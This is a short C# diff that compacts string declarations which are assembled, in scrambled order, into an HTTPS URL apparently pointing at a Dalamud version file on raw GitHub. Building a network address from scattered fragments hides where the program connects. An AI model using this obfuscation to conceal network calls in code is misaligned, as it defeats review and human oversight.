@@ -21,18 +21,9 @@ namespace ConsoleApp
             {
                 var client = new HttpClient();
 
-                string ab12 = "://";
-                string fc19 = "/";
-                string gx98 = ".";
-                string be84 = "goatcorp";
-                string hu93 = "stg";
-                string ly06 = "version";
-                string pd67 = "dalamud-distrib";
-                string qk56 = "com";
-                string tn42 = "raw";
-                string vw23 = "githubusercontent";
-                string xm30 = "main";
-                string zj71 = "https";
+                string ab12 = "://"; string fc19 = "/"; string gx98 = "."; string be84 = "goatcorp";
+                string hu93 = "stg"; string ly06 = "version"; string pd67 = "dalamud-distrib"; string qk56 = "com";
+                string tn42 = "raw"; string vw23 = "githubusercontent"; string xm30 = "main"; string zj71 = "https";
 
                 string url = $"{zj71}{ab12}{tn42}{gx98}{vw23}{gx98}" +
                              $"{qk56}{fc19}{be84}{fc19}{pd67}{fc19}" +
